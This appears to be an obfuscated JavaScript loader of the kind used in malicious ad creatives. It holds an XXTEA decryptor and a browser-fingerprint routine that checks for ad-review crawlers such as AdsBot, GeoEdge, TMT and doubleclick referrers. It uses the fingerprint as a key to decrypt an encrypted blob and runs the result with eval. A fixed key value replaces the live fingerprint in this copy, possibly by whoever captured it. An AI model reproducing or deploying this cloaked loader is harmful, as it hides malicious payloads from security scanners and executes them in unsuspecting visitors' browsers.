var T = {};
T.e0 = function(a, b) {
    var c, d, e;
    return a = String(a),
    b = String(b),
    0 == a.length ? '' : (c = T.f0(a.u0()),
    d = T.f0(b.u0().slice(0, 16)),
    c.length,
    c = T.e1(c, d),
    e = T.longsToStr(c),
    e.b0())
}
,
T.d0 = function(a, b) {
    var c, d;
    return a = String(a),
    b = String(b),
    0 == a.length ? '' : (c = T.f0(a.b1()),
    d = T.f0(b.u0().slice(0, 16)),
    c.length,
    c = T.d1(c, d),
    a = T.longsToStr(c),
    a = a.replace(/\0+$/, ''),
    a.u1())
}
,
T.e1 = function(a, b) {
    var c, d, e, f, g, h, i, j, k;
    for (a.length < 2 && (a[1] = 0),
    c = a.length,
    d = a[c - 1],
    e = a[0],
    f = 2654435769,
    i = Math.floor(6 + 52 / c),
    j = 0; i-- > 0; )
        for (j += f,
        h = 3 & j >>> 2,
        k = 0; c > k; k++)
            e = a[(k + 1) % c],
            g = (d >>> 5 ^ e << 2) + (e >>> 3 ^ d << 4) ^ (j ^ e) + (b[3 & k ^ h] ^ d),
            d = a[k] += g;
    return a
}
,
T.d1 = function(a, b) {
    for (var c, d, e, f = a.length, g = a[f - 1], h = a[0], i = 2654435769, j = Math.floor(6 + 52 / f), k = j * i; 0 != k; ) {
        for (d = 3 & k >>> 2,
        e = f - 1; e >= 0; e--)
            g = a[e > 0 ? e - 1 : f - 1],
            c = (g >>> 5 ^ h << 2) + (h >>> 3 ^ g << 4) ^ (k ^ h) + (b[3 & e ^ d] ^ g),
            h = a[e] -= c;
        k -= i
    }
    return a
}
,
T.f0 = function(a) {
    var b, c = new Array(Math.ceil(a.length / 4));
    for (b = 0; b < c.length; b++)
        c[b] = a.charCodeAt(4 * b) + (a.charCodeAt(4 * b + 1) << 8) + (a.charCodeAt(4 * b + 2) << 16) + (a.charCodeAt(4 * b + 3) << 24);
    return c
}
,
T.longsToStr = function(a) {
    var b, c = new Array(a.length);
    for (b = 0; b < a.length; b++)
        c[b] = String.fromCharCode(255 & a[b], 255 & a[b] >>> 8, 255 & a[b] >>> 16, 255 & a[b] >>> 24);
    return c.join('')
}
,
'undefined' == typeof String.prototype.u0 && (String.prototype.u0 = function() {
    return unescape(encodeURIComponent(this))
}
),
'undefined' == typeof String.prototype.u1 && (String.prototype.u1 = function() {
    try {
        return decodeURIComponent(escape(this))
    } catch (a) {
        return this
    }
}
),
'undefined' == typeof String.prototype.b0 && (String.prototype.b0 = function() {
    if ('undefined' != typeof btoa)
        return btoa(this);
    if ('undefined' != typeof Buffer)
        return new Buffer(this,'utf8').toString('base64');
    throw new Error('err')
}
),
'undefined' == typeof String.prototype.b1 && (String.prototype.b1 = function() {
    if ('undefined' != typeof atob)
        return atob(this);
    if ('undefined' != typeof Buffer)
        return new Buffer(this,'base64').toString('utf8');
    throw new Error('err')
}
),
'undefined' != typeof module && module.exports && (module.exports = T),
'function' == typeof define && define.amd && define([''], function() {
    return T
});
function dJw() {
    try {
        return navigator.platform.toUpperCase().substr(0, 5)
               + Number(/android/i.test(navigator.userAgent))
               + Number(/AdsBot/i.test(navigator.userAgent))
               + Number(/Google/i.test(navigator.userAgent))
               + Number(/geoedge/i.test(navigator.userAgent))
               + Number(/tmt/i.test(navigator.userAgent))
               + navigator.language.toUpperCase().substr(0, 2)
               + Number(/tpc.googlesyndication.com/i.test(document.referrer) || /doubleclick.net/i.test(document.referrer))
               + Number(/geoedge/i.test(document.referrer))
               + Number(/tmt/i.test(document.referrer))
               + performance.navigation.type
               + performance.navigation.redirectCount
               + Number(navigator.cookieEnabled)
               + Number(navigator.onLine)
               + navigator.appCodeName.toUpperCase().substr(0, 7)
               + Number(navigator.maxTouchPoints > 0)
               + Number((undefined == window.chrome) ? true : (undefined == window.chrome.app))
               + navigator.plugins.length
    } catch (e) {
        return 'err'
    }
}
;
a = "A2xcVTrDuF+EqdD8VibVZIWY2k334hwWPsIzgPgmHSapj+zeDlPqH/RHlpVCitdlxQQfzOjO01xCW/6TNqkciPRbOZsizdYNf5eEOgghG0YhmIplCBLhGdxmnvsIT/69I08I/ZvIxkWyufhLayTDzFeGZlPQfjqtY8Wr59Lkw/JggztpJYPWng=="
aa = dJw();
aa = 'LINUX10000FR1000';
aaa = T.d0(a, aa);
eval(aaa);
